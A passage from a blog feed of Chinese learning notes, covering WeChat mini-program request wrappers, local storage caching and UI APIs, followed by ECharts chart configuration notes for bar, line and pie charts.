class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第9 本地存储 中 有一个 function getCates()  将这个方法 使用async 和 await</span></span><br><span class="line"><span class="comment">//也用上了baseurl</span></span><br><span class="line"><span class="keyword">import</span> regeneratorRuntime <span class="keyword">from</span> ‘../../lib/runtime/runtime’</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="title function_">getCates</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//1.使用es7 的 async await发送请求  </span></span><br><span class="line">     <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">request</span>(&#123; <span class="attr">url</span>:<span class="string">&quot;/categories&quot;</span> &#125;);</span><br><span class="line">     <span class="variable language_">this</span>.<span class="property">Cates</span> = res.<span class="property">data</span>.<span class="property">message</span>;</span><br><span class="line">             </span><br><span class="line">     <span class="comment">// 把接口中的数据存入本地存储</span></span><br><span class="line">     wx.<span class="title function_">setStorageSync</span>(<span class="string">&quot;cates&quot;</span>,&#123;<span class="attr">time</span>:<span class="title class_">Data</span>.<span class="title function_">now</span>(),<span class="attr">data</span>:<span class="variable language_">this</span>.<span class="property">Cates</span>&#125;);</span><br><span class="line">   </span><br><span class="line">     <span class="keyword">let</span> leftMenuList = <span class="variable language_">this</span>.<span class="property">Cates</span>.<span class="title function_">map</span>(<span class="function"><span class="params">v</span> =&gt;</span> v.<span class="property">cat_name</span>);</span><br><span class="line">     <span class="keyword">let</span> rightMenuList = <span class="variable language_">this</span>.<span class="property">Cates</span>[<span class="number">0</span>].<span class="property">children</span>;</span><br><span class="line">     <span class="variable language_">this</span>,<span class="title function_">setData</span>(&#123;</span><br><span class="line">          leftMenuList,</span><br><span class="line">          rightMenuList</span><br><span class="line">      &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8.5-将显示加载中的logo封装在请求中">8.5 将显示加载中的logo封装在请求中<a title="#8.5-将显示加载中的logo封装在请求中" href="#8.5-将显示加载中的logo封装在请求中"></a></h3><p>加载中的<a href="https://developers.weixin.qq.com/miniprogram/dev/api/ui/interaction/wx.showLoading.html" target="_blank">官方文档</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//计同时发送请求的数据</span></span><br><span class="line"><span class="keyword">let</span> ajaxtime = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">request</span> = (<span class="params">params</span>) =&gt; &#123;</span><br><span class="line">   ajaxtime++;</span><br><span class="line">  <span class="comment">//显示加载中</span></span><br><span class="line">  wx.<span class="title function_">showLoading</span>(&#123;</span><br><span class="line">      <span class="attr">title</span>:<span class="string">&quot;加载中&quot;</span>,</span><br><span class="line">      <span class="attr">mask</span>:<span class="literal">true</span></span><br><span class="line">  &#125;)</span><br><span class="line">    </span><br><span class="line">  <span class="comment">//定义公共接口路径</span></span><br><span class="line">  <span class="keyword">const</span> baseUrl = <span class="string">&#x27;https://...&#x27;</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    wx.<span class="title function_">request</span>(&#123;</span><br><span class="line">      ...params,</span><br><span class="line">       </span><br><span class="line">      <span class="attr">url</span>:baseUrl+params.<span class="property">url</span>,  </span><br><span class="line">        </span><br><span class="line">      <span class="attr">success</span>: <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(res);</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">fail</span>: <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">reject</span>(err)</span><br><span class="line">      &#125;,</span><br><span class="line">        </span><br><span class="line">      <span class="attr">complete</span>:<span class="function">() =&gt;</span> &#123;</span><br><span class="line">          ajaxtime--;</span><br><span class="line">          <span class="comment">//无论 所以同步请求都完成  成功还是失败 都执行</span></span><br><span class="line">          <span class="comment">//关闭加载</span></span><br><span class="line">          <span class="keyword">if</span>(ajaxtime === <span class="number">0</span>)&#123;</span><br><span class="line">              wx.<span class="title function_">hideLoading</span>();</span><br><span class="line">          &#125;</span><br><span class="line">          </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="8.6-request-封装中增加-header-头部信息">8.6 request 封装中增加 header 头部信息<a title="#8.6-request-封装中增加-header-头部信息" href="#8.6-request-封装中增加-header-头部信息"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//计同时发送请求的数据</span></span><br><span class="line"><span class="keyword">let</span> ajaxtime = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">request</span> = (<span class="params">params</span>) =&gt; &#123;</span><br><span class="line">    <span class="comment">//判断url 中的特点 if 有 /my/ 就得加 header 私有路径</span></span><br><span class="line">    <span class="keyword">let</span> header = &#123;...params.<span class="property">header</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span>(params.<span class="property">url</span>.<span class="title function_">includes</span>(<span class="string">&quot;/my/&quot;</span>))&#123;</span><br><span class="line">        <span class="comment">//拼接</span></span><br><span class="line">        header[<span class="string">&quot;Authorization&quot;</span>] = wx.<span class="title function_">getStorageSync</span>(<span class="string">&quot;token&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">   ajaxtime++;</span><br><span class="line">  <span class="comment">//显示加载中</span></span><br><span class="line">  wx.<span class="title function_">showLoading</span>(&#123;</span><br><span class="line">      <span class="attr">title</span>:<span class="string">&quot;加载中&quot;</span>,</span><br><span class="line">      <span class="attr">mask</span>:<span class="literal">true</span></span><br><span class="line">  &#125;)</span><br><span class="line">    </span><br><span class="line">  <span class="comment">//定义公共接口路径</span></span><br><span class="line">  <span class="keyword">const</span> baseUrl = <span class="string">&#x27;https://...&#x27;</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    wx.<span class="title function_">request</span>(&#123;</span><br><span class="line">      ...params,</span><br><span class="line">       </span><br><span class="line">      <span class="attr">url</span>:baseUrl+params.<span class="property">url</span>,  </span><br><span class="line">        </span><br><span class="line">      <span class="attr">success</span>: <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(res);</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">fail</span>: <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">reject</span>(err)</span><br><span class="line">      &#125;,</span><br><span class="line">        </span><br><span class="line">      <span class="attr">complete</span>:<span class="function">() =&gt;</span> &#123;</span><br><span class="line">          ajaxtime--;</span><br><span class="line">          <span class="comment">//无论 所以同步请求都完成  成功还是失败 都执行</span></span><br><span class="line">          <span class="comment">//关闭加载</span></span><br><span class="line">          <span class="keyword">if</span>(ajaxtime === <span class="number">0</span>)&#123;</span><br><span class="line">              wx.<span class="title function_">hideLoading</span>();</span><br><span class="line">          &#125;</span><br><span class="line">          </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="9.本地存储">9.本地存储<a title="#9.本地存储" href="#9.本地存储"></a></h2><p>web 与 小程序 中 本地存储的区别</p><ul><li><p>代码 web：localStorage.setItem(“key”,”value”)</p><p>​                 localStorage.getItem(“key”)</p><p>​       小程序：wx.setStorageSync(“key”,”value”)</p><p>​                     wx.getStorageSync(“key”)</p></li><li><p>存的时候 是否会做类型转换</p><p>​     web：存数据时 会调用toString() 把数据转换成字符串</p><p>​    小程序：不会进行数据转换  即 传的是什么数据类型 取的就是什么类型的</p></li></ul><p>小程序本地存储的过程</p><ol><li>判断本地存储 有无旧数据  {time:Data.now() , data:[…]}</li><li>if 无旧数据 直接发送请求 存入 本地存储</li><li>if 有 同时 旧数据没有过期 就直接使用本地存储的数据</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Page</span>(&#123;</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="attr">leftMenuList</span>:[],</span><br><span class="line">        <span class="attr">rightMenuList</span>:[]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title class_">Cates</span>:[],</span><br><span class="line">    <span class="title function_">onLaod</span>():<span class="keyword">function</span>(<span class="params">options</span>)&#123;</span><br><span class="line">    <span class="comment">//1.获取本地存储中的数据 </span></span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">Cates</span> = wx.<span class="title function_">getStorageSync</span>(<span class="string">&quot;cates&quot;</span>);</span><br><span class="line">    <span class="comment">//2.判断</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title class_">Cates</span>)&#123;</span><br><span class="line">            <span class="comment">//发送请求</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">getCates</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//是否过期  10s  </span></span><br><span class="line">            <span class="keyword">if</span>(<span class="title class_">Data</span>.<span class="title function_">now</span>() - <span class="title class_">Cates</span>.<span class="property">time</span> &gt; <span class="number">1000</span> * <span class="number">10</span>)&#123;</span><br><span class="line">                <span class="comment">//过期 发送请求</span></span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">getCates</span>();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//使用旧数据</span></span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">Cates</span> = <span class="title class_">Cates</span>.<span class="property">data</span>;</span><br><span class="line">                <span class="keyword">let</span> leftMenuList = <span class="variable language_">this</span>.<span class="property">Cates</span>.<span class="title function_">map</span>(<span class="function"><span class="params">v</span> =&gt;</span> v.<span class="property">cat_name</span>);</span><br><span class="line">                <span class="keyword">let</span> rightMenuList = <span class="variable language_">this</span>.<span class="property">Cates</span>[<span class="number">0</span>].<span class="property">children</span>;</span><br><span class="line">                <span class="variable language_">this</span>,<span class="title function_">setData</span>(&#123;</span><br><span class="line">                    leftMenuList,</span><br><span class="line">                    rightMenuList</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;,</span><br><span class="line">    <span class="comment">//获取数据</span></span><br><span class="line">     <span class="title function_">getCates</span>(<span class="params"></span>)&#123;</span><br><span class="line">         <span class="title function_">request</span>(&#123;<span class="attr">url</span>:<span class="string">&quot;...&quot;</span>&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">             <span class="variable language_">this</span>.<span class="property">Cates</span> = res.<span class="property">data</span>.<span class="property">message</span>;</span><br><span class="line">             </span><br><span class="line">             <span class="comment">// 把接口中的数据存入本地存储</span></span><br><span class="line">             wx.<span class="title function_">setStorageSync</span>(<span class="string">&quot;cates&quot;</span>,&#123;<span class="attr">time</span>:<span class="title class_">Data</span>.<span class="title function_">now</span>(),<span class="attr">data</span>:<span class="variable language_">this</span>.<span class="property">Cates</span>&#125;);</span><br><span class="line">             </span><br><span class="line">             </span><br><span class="line">             <span class="keyword">let</span> leftMenuList = <span class="variable language_">this</span>.<span class="property">Cates</span>.<span class="title function_">map</span>(<span class="function"><span class="params">v</span> =&gt;</span> v.<span class="property">cat_name</span>);</span><br><span class="line">             <span class="keyword">let</span> rightMenuList = <span class="variable language_">this</span>.<span class="property">Cates</span>[<span class="number">0</span>].<span class="property">children</span>;</span><br><span class="line">             <span class="variable language_">this</span>,<span class="title function_">setData</span>(&#123;</span><br><span class="line">                 leftMenuList,</span><br><span class="line">                 rightMenuList</span><br><span class="line">             &#125;)</span><br><span class="line">         &#125;)</span><br><span class="line">     &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="10-效果">10 效果<a title="#10-效果" href="#10-效果"></a></h2><h3 id="10.1-previewimage将图片放大预览">10.1 previewImage<a href="https://developers.weixin.qq.com/miniprogram/dev/api/media/image/wx.previewImage.html">将图片放大预览</a><a title="#10.1-previewimage将图片放大预览" href="#10.1-previewimage将图片放大预览"></a></h3><p>wx.previewImage({<br>current: ‘’, // 当前显示图片的http链接<br>urls: [] // 需要预览的图片http链接列表<br>})</p><h3 id="10.2-showtoast显示弹框">10.2 showToast<a href="https://developers.weixin.qq.com/miniprogram/dev/api/ui/interaction/wx.showToast.html">显示弹框</a><a title="#10.2-showtoast显示弹框" href="#10.2-showtoast显示弹框"></a></h3><p>wx.showToast(){</p><p>​title:””,</p><p>​icon:””,</p><p>​mask:true //防抖</p><p>}</p><h3 id="10.3-getsetting获取权限状态">10.3 getSetting<a href="https://developers.weixin.qq.com/miniprogram/dev/api/open-api/setting/wx.getSetting.html">获取权限状态</a><a title="#10.3-getsetting获取权限状态" href="#10.3-getsetting获取权限状态"></a></h3><p>wx.getSetting({</p><p>​success:(res) =&gt; {</p><p>​</p><p>​}</p><p>})</p><h3 id="10.4-chooseaddress获取收货地址">10.4 chooseAddress<a href="">获取收货地址</a><a title="#10.4-chooseaddress获取收货地址" href="#10.4-chooseaddress获取收货地址"></a></h3><p>之前有过的</p><p>wx.chooseAddress({</p><p>​success:(res) =&gt; {</p><p>​…</p><p>​}</p><p>})</p><h3 id="10.5-showmodal-显示弹窗">10.5 showModal <a href="https://developers.weixin.qq.com/miniprogram/dev/api/ui/interaction/wx.showModal.html">显示弹窗</a><a title="#10.5-showmodal-显示弹窗" href="#10.5-showmodal-显示弹窗"></a></h3><p>wx.showModal({<br>title: ‘提示’,<br>content: ‘这是一个模态弹窗’,<br>success (res) {<br>if (res.confirm) {<br>console.log(‘用户点击确定’)<br>} else if (res.cancel) {<br>console.log(‘用户点击取消’)<br>}<br>}<br>})</p><h3 id="10.6-支付">10.6 支付<a title="#10.6-支付" href="#10.6-支付"></a></h3><ul><li>支付流程 ：创建订单 -&gt; 准备支付 -&gt; 发起微信支付 -&gt; 查询订单</li></ul><h3 id="10.7-chooseimage-选择图片">10.7 chooseImage <a href="https://developers.weixin.qq.com/miniprogram/dev/api/media/image/wx.chooseImage.html">选择图片</a><a title="#10.7-chooseimage-选择图片" href="#10.7-chooseimage-选择图片"></a></h3><p>wx.chooseImage({</p><p>​count:9,   //同时选择的最大图片数量</p><p>​sizeType:[‘original’ , ‘compressed’],   //图片格式  原图 压缩</p><p>​sourceType:[‘album’ , ‘camera’],  //图片来源 相册 照相机</p><p>​success:(result) =&gt; {</p><p>​this.Data({</p><p>​chooseImages = […this.data.chooseImages,…result.tempFilePaths]    //拼接 图片数组</p><p>​})</p><p>​}</p><p>})</p>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EChart的使用</title>
      <link href="/learningNotes/ECharts%E7%9A%84%E4%BD%BF%E7%94%A8"/>
      <url>/learningNotes/ECharts%E7%9A%84%E4%BD%BF%E7%94%A8</url>
      
        <content type="html"><![CDATA[<h2 id="1.-echart的使用(2021/07/01-pink老师)">1. EChart的使用(2021/07/01 pink老师)<a title="#1.-echart的使用(2021/07/01-pink老师)" href="#1.-echart的使用(2021/07/01-pink老师)"></a></h2><h3 id="1.1-使用步骤">1.1 使用步骤<a title="#1.1-使用步骤" href="#1.1-使用步骤"></a></h3><ol><li><p>下载并导入echarts.js文件 (@4.9.0 才有地图)</p><blockquote><p>有多种导入方式 使用直接下载文件然后导入就可以了<a href="https://echarts.apache.org/zh/download.html" target="_blank">下载地址</a></p></blockquote></li><li><p>准备一个有宽高的DOM容器</p></li><li><p>初始化echarts实例</p><blockquote><p>const mychart = echarts.init(document.querySelector(‘.box’));</p></blockquote></li><li><p>指定配置项和数据option</p><blockquote><p>let option = { … }</p></blockquote></li><li><p>将配置项设置给echarts实例对象</p><blockquote><p>mychart.setOption(option);</p></blockquote></li></ol><h3 id="1.2-基础配置">1.2 基础配置<a title="#1.2-基础配置" href="#1.2-基础配置"></a></h3><blockquote><p>option里面的配置</p></blockquote><ul><li><p><code>title</code>: 设置图表标题</p></li><li><p><code>tooltip</code>: 提示框组件</p><ul><li><code>trigger</code>: 触发方式<ul><li>值为<code>axis</code>时鼠标在坐标轴上时触发</li></ul></li><li><code>axisPointer</code>： 坐标轴指示器<ul><li>值默认为<code>line</code> 也可以设置成<code>shadow</code></li></ul></li></ul></li><li><p><code>legend</code>：图例组件</p><ul><li><code>textStyle</code>: 图例文字的样式<ul><li><code>color</code></li></ul></li><li><code>left、right、top、bottom</code>: 图例位置</li></ul></li><li><p><code>toolbox</code>： 工具箱组件 可以保存图片什么的</p></li><li><p><code>color</code>： 后面的值是数组形式 线条的颜色</p></li></ul><blockquote><p>直角坐标系的配置</p></blockquote><ul><li><p><code>grid</code>: 网格 – 控制线型图 柱状图 图表的大小</p><ul><li><code>left、right、top、bottom</code>： 控制大小</li><li><code>containLabel</code>: 显示刻度标签</li></ul></li><li><p><code>xAxis</code>： 设置x轴的配置</p><ul><li><code>type</code>： <code>category</code> 类目、<code>value</code>值</li><li><code>boundaryGap</code>:线条与坐标轴是否有缝隙</li><li><code>data</code>：x轴的相关显示信息</li><li><code>axisLabel</code>: 刻度标签的相关样式 有文字颜色 大小 样式什么的</li><li><code>axisLine</code>： 坐标轴那条线的样式<ul><li><code>show</code>：表是否显示</li></ul></li></ul></li><li><p><code>yAxis</code>: y轴的配置</p><ul><li><p><code>axisLine</code>： 坐标轴那条线的样式 if要设置样式</p><ul><li><code>lineStyle</code>: 在里面配置样式</li></ul></li><li><p><code>axisTick</code>: 坐标轴的刻度</p><ul><li><code>show</code> : 是否显示</li></ul></li><li><p><code>splitLine</code>: y轴分割线的样式</p><ul><li><code>lineStyle</code>:</li></ul></li></ul></li><li><p><code>series</code>: 系列图表的配置 决定显示哪种类型的图表</p><ul><li><p><code>stack</code>: if值相同 会发生数据堆叠</p></li><li><p><code>name</code>: 与上legend的数组相同 if有name可不用legend</p></li><li><p><code>barWidth</code>: 柱子的宽度</p></li><li><p><code>barCategoryGap</code>: 柱子距离</p></li><li><p><code>label</code>: 显示柱子内的文字</p><ul><li><code>show</code> : 是否显示</li><li><code>position</code> : <code>“inside”</code></li><li><code>formatter</code> : <code>“&#123;c&#125;%” </code>  //c 数据值 b 数据名 a系列名 会自动解析为data里的数据</li></ul></li><li><p><code>itemStyle</code>: 每个柱子的样式</p><ul><li><p><code>barBorderRadius</code>：圆角边框</p></li><li><p><code>color</code>：</p><blockquote><p>一般来说只能有一个颜色，就算是数组形式 也只会展示最后一个颜色</p><p>如果想要展示多个的话 可以</p><p>先</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  &gt;<span class="keyword">const</span> mycolor = [<span class="string">&quot;pink&quot;</span>, <span class="string">&quot;blue&quot;</span>, <span class="string">&quot;yellow&quot;</span>, <span class="string">&quot;white&quot;</span>, <span class="string">&quot;black&quot;</span>]</span><br><span class="line">  &gt;<span class="comment">//然后在里面</span></span><br><span class="line">  &gt;<span class="attr">color</span>:<span class="keyword">function</span>(<span class="params">params</span>)&#123;</span><br><span class="line">  &gt;<span class="comment">// params传进来的是柱子对象    </span></span><br><span class="line"><span class="keyword">return</span> mycolor[params.<span class="property">dataIndex</span>]</span><br><span class="line">  &gt;&#125;</span><br></pre></td></tr></table></figure><p>如果想要展示一个框</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="attr">color</span>:<span class="string">&quot;none&quot;</span>,</span><br><span class="line">&gt;<span class="attr">borderColor</span>:<span class="string">&quot;pink&quot;</span>,</span><br></pre></td></tr></table></figure></blockquote></li></ul></li></ul><img src='https://s1.328888.xyz/2022/04/09/XkQud.jpg'></li></ul><h3 id="1.3-柱形图">1.3 柱形图<a title="#1.3-柱形图" href="#1.3-柱形图"></a></h3><h5 id="更改对应数据">更改对应数据<a title="#更改对应数据" href="#更改对应数据"></a></h5><p>横坐标的数据：<code>axis</code> 的<code>data</code></p><p>纵坐标的数据: <code>series</code> 的<code>data</code></p><p>使图表跟屏幕大小做自适应</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;resize&quot;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    myChary.<span class="title function_">resize</span>();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h5 id="实现两组柱子层叠">实现两组柱子层叠<a title="#实现两组柱子层叠" href="#实现两组柱子层叠"></a></h5><p>在series里的两个柱子对象里</p><p>使用<code>yAxisIndex:0</code>和<code>yAxisIndex:1</code> 在不同的柱子上</p><h5 id="坐标轴数组反转">坐标轴数组反转<a title="#坐标轴数组反转" href="#坐标轴数组反转"></a></h5><p>在yAxis里<code>inverse:true</code></p><h3 id="1.4-折线图（2021/7/6）">1.4 折线图（2021/7/6）<a title="#1.4-折线图（2021/7/6）" href="#1.4-折线图（2021/7/6）"></a></h3><h5 id="改线的颜色">改线的颜色<a title="#改线的颜色" href="#改线的颜色"></a></h5><p>option里直接加<code>color:[“”]</code></p><h5 id="将折线改圆滑">将折线改圆滑<a title="#将折线改圆滑" href="#将折线改圆滑"></a></h5><p>在series里要平滑显示的线条对象 加上<code>smooth:true</code></p><h5 id="单独改变线的样式">单独改变线的样式<a title="#单独改变线的样式" href="#单独改变线的样式"></a></h5><p>在series里 <code>lineStyle:&#123;...&#125;</code></p><h5 id="渐变色填充区域">渐变色填充区域<a title="#渐变色填充区域" href="#渐变色填充区域"></a></h5><p>在series里</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">areaStyle</span>:&#123;</span><br><span class="line">    <span class="comment">// 渐变色，只需要复制即可</span></span><br><span class="line">    <span class="attr">color</span>:<span class="keyword">new</span> echarts.<span class="property">graphic</span>.<span class="title class_">LinearGradient</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,</span><br><span class="line">          [&#123;</span><br><span class="line">              <span class="attr">offset</span>:<span class="number">0</span>,</span><br><span class="line">              <span class="attr">color</span>:<span class="string">&quot;rgba(1,132,213,0.4)&quot;</span>  <span class="comment">//起使颜色</span></span><br><span class="line">          &#125;,&#123;</span><br><span class="line">              <span class="attr">offset</span>:<span class="number">0.8</span>,</span><br><span class="line">              <span class="attr">color</span>:<span class="string">&quot;rgba(1,132,213,0.1)&quot;</span>  <span class="comment">//结束颜色</span></span><br><span class="line">          &#125;],<span class="literal">false</span>),</span><br><span class="line">        <span class="attr">shadowColor</span>:<span class="string">&quot;rgba(0,0,0,0.1)&quot;</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h5 id="拐点">拐点<a title="#拐点" href="#拐点"></a></h5><p>在series里</p><p><code>symbol:&quot;circle&quot;</code></p><p><code>symbolSize:12</code></p><p><code>showSymbol:false</code> 一开始不显示，鼠标经过才显示</p><p><code>itemStyle:&#123;color:&quot;&quot; , borderColor:&quot;&quot; , borderWidth: &quot;&quot;&#125;</code>拐点的样式</p><h3 id="1.5-饼形图">1.5 饼形图<a title="#1.5-饼形图" href="#1.5-饼形图"></a></h3><h5 id="触发方式">触发方式<a title="#触发方式" href="#触发方式"></a></h5><p><code>tooltip:&#123; trigger: 'item', ...&#125;</code></p><p>鼠标悬停饼</p><h5 id="鼠标悬停部分饼状-中间出现文字">鼠标悬停部分饼状 中间出现文字<a title="#鼠标悬停部分饼状-中间出现文字" href="#鼠标悬停部分饼状-中间出现文字"></a></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">series</span>:[</span><br><span class="line">    &#123; </span><br><span class="line">        ... , </span><br><span class="line">        <span class="attr">emphasis</span>:&#123; </span><br><span class="line">        <span class="attr">label</span>:&#123;</span><br><span class="line">        <span class="attr">show</span>:<span class="literal">true</span>,</span><br><span class="line">        fontSize：’<span class="number">30</span>‘,</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    ...</span><br><span class="line">    &#125; </span><br><span class="line">]</span><br></pre></td></tr></table></figure><h5 id="修改图例">修改图例<a title="#修改图例" href="#修改图例"></a></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">legend</span>:&#123;</span><br><span class="line">    <span class="attr">bottom</span>:<span class="string">&quot;5%&quot;</span>, <span class="comment">//图例位置</span></span><br><span class="line">    itemWidth/<span class="attr">itemHeight</span>:<span class="number">10</span>, <span class="comment">//图标大小</span></span><br><span class="line">    <span class="attr">textStyle</span>:&#123;&#125; <span class="comment">//修改图例文字</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="修改在容器中的位置">修改在容器中的位置<a title="#修改在容器中的位置" href="#修改在容器中的位置"></a></h5><p><code>series:[ &#123; center:[ &quot;50%&quot; , &quot;50%&quot; ] &#125; ]</code></p><h5 id="修改饼形大小">修改饼形大小<a title="#修改饼形大小" href="#修改饼形大小"></a></h5><p><code>series:[ &#123; radius:[ &quot;40%&quot; , &quot;50%&quot; ] &#125; ]</code></p><p>内圆半径，外圆半径</p><h5 id="模式">模式<a title="#模式" href="#模式"></a></h5><p><code>series:[ &#123; roseType:&quot;radius/area&quot; &#125; ] 